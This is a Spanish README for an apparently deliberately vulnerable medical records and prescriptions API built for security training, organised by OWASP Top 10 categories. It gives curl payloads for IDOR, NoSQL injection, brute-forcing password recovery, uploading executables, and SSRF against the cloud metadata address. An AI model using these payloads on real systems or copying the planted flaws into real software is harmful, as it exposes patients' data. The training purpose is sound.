# API de Recetas e Historiales Clinicos

**ADVERTENCIA: Esta aplicacion contiene vulnerabilidades intencionales. NO usar en produccion. Solo para fines educativos y de evaluacion de seguridad.**

## Contexto

Aplicacion backend para que medicos y pacientes consulten recetas e historiales clinicos.

## Instalacion

```bash
npm install
npm start
```

El servidor corre en `http://localhost:3000` (HTTP sin cifrar).

## Usuarios de prueba

| Usuario           | Contrasena    | Rol      |
|-------------------|---------------|----------|
| doctor_martinez   | martinez123   | doctor   |
| doctor_lopez      | lopez2024     | doctor   |
| paciente_garcia   | garcia456     | paciente |

## Vulnerabilidades OWASP Top 10

### A01 - Broken Access Control (Control de Acceso Roto)

Cualquier usuario autenticado puede ver el historial clinico de cualquier paciente cambiando el ID en el endpoint.

- **Endpoint:** `GET /api/record/:id`
- **Explotacion:**
  ```bash
  # Login como paciente
  curl -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"paciente_garcia","password":"garcia456"}'

  # Ver historial de OTRO paciente
  curl http://localhost:3000/api/record/1 -H "Authorization: <token>"
  ```

### A02 - Cryptographic Failures (Fallos Criptograficos)

Las recetas medicas digitales se firman y transmiten por HTTP sin cifrado. Las firmas digitales viajan en texto claro.

- **Endpoint:** `GET /api/prescription/:id`
- **Problema:** El servidor corre sobre HTTP, no HTTPS. Las firmas se exponen en la respuesta JSON.

### A03 - Injection (Inyeccion NoSQL)

La busqueda de diagnosticos es vulnerable a inyeccion NoSQL mediante operadores `$ne`, `$regex`, etc.

- **Endpoint:** `GET /api/diagnosis/search`
- **Explotacion:**
  ```bash
  # Inyeccion con $ne devuelve TODOS los diagnosticos
  curl "http://localhost:3000/api/diagnosis/search?diagnosis[\$ne]=null" -H "Authorization: <token>"

  # Inyeccion con $regex
  curl "http://localhost:3000/api/diagnosis/search?diagnosis[\$regex]=.*" -H "Authorization: <token>"

  # Buscar diagnosticos graves
  curl "http://localhost:3000/api/diagnosis/search?severity=grave" -H "Authorization: <token>"
  ```

### A04 - Insecure Design (Diseno Inseguro)

Los datos de pacientes se guardan en carpetas publicas accesibles via web sin autenticacion.

- **URLs publicas:**
  - `http://localhost:3000/patients/juan-perez.json`
  - `http://localhost:3000/patients/maria-gonzalez.json`
- **Problema:** Cualquier persona puede acceder a los datos medicos completos sin autenticarse.

### A05 - Security Misconfiguration (Configuracion de Seguridad Insegura)

1. **Cabeceras HTTP de seguridad ausentes:** No hay `X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`.
2. **Mensajes de error con stack traces:** Los errores exponen el stack trace completo.
3. **Fuga de informacion del SO:** El endpoint raiz (`/`) expone el sistema operativo, arquitectura, hostname, version de Node, memoria, y CPUs.

- **Explotacion:**
  ```bash
  curl http://localhost:3000/
  ```

### A06 - Vulnerable and Outdated Components (Componentes Vulnerables y Desactualizados)

Dependencia del paquete NPM `cryptiles` (version 3.1.2), descontinuado por CVE-2018-1000620 (ataque de sincronizacion en comparacion HMAC).

- **Endpoint:** `GET /api/verify-signature?a=...&b=...`
- **Problema:** El paquete `cryptiles` fue deprecado por vulnerabilidades criticas conocidas.

### A07 - Identification and Authentication Failures (Fallos de Identificacion y Autenticacion)

Recuperacion de contrasena mediante preguntas de seguridad triviales ("nombre de tu mascota") sin limite de intentos (fuerza bruta).

- **Endpoint:** `POST /api/recover-password`
- **Explotacion:**
  ```bash
  # Intentos ilimitados - la API incluso da la pista de la pregunta
  curl -X POST http://localhost:3000/api/recover-password \
    -H "Content-Type: application/json" \
    -d '{"username":"doctor_martinez","securityAnswer":"rex","newPassword":"hackeada"}'
  ```

### A08 - Software and Data Integrity Failures (Fallos de Integridad de Software y Datos)

Carga de archivos de examenes medicos sin validacion de contenido. Se pueden subir archivos ejecutables.

- **Endpoint:** `POST /api/upload-exam`
- **Explotacion:**
  ```bash
  # Subir un archivo ejecutable
  curl -X POST http://localhost:3000/api/upload-exam \
    -H "Authorization: <token>" \
    -F "examFile=@malware.exe"
  ```

### A09 - Security Logging and Monitoring Failures (Fallos de Registro y Monitoreo)

Las modificaciones de recetas por usuarios no generan registros de auditoria forense. No hay log de quien cambio que, ni cuando, ni los valores originales.

- **Endpoint:** `PUT /api/prescription/:id`
- **Problema:** No hay sistema de logging, no hay registro inmutable, no hay trazabilidad.

### A10 - Server-Side Request Forgery (SSRF)

La funcionalidad de descarga de historias clinicas externas permite al cliente proporcionar URLs arbitrarias que el servidor consulta.

- **Endpoint:** `GET /api/fetch-external-record?url=...`
- **Explotacion:**
  ```bash
  # Acceder a metadatos de la nube (AWS)
  curl "http://localhost:3000/api/fetch-external-record?url=http://169.254.169.254/latest/meta-data/" -H "Authorization: <token>"

  # Escanear servicios internos
  curl "http://localhost:3000/api/fetch-external-record?url=http://localhost:8080" -H "Authorization: <token>"

  # Acceder a archivos internos
  curl "http://localhost:3000/api/fetch-external-record?url=http://localhost:3000/" -H "Authorization: <token>"
  ```

## Resumen de Endpoints

| Metodo | Endpoint                          | Vulnerabilidad |
|--------|-----------------------------------|----------------|
| GET    | `/`                               | A05            |
| POST   | `/api/login`                      | -              |
| POST   | `/api/recover-password`           | A07            |
| GET    | `/api/record/:id`                 | A01            |
| GET    | `/api/patients`                   | A01            |
| GET    | `/api/prescription/:id`           | A02            |
| PUT    | `/api/prescription/:id`           | A09            |
| GET    | `/api/diagnosis/search`           | A03            |
| POST   | `/api/upload-exam`                | A08            |
| GET    | `/api/fetch-external-record`      | A10            |
| GET    | `/api/verify-signature`           | A06            |
| GET    | `/patients/*.json`                | A04            |
| -      | (ausencia de cabeceras de seg.)   | A05            |
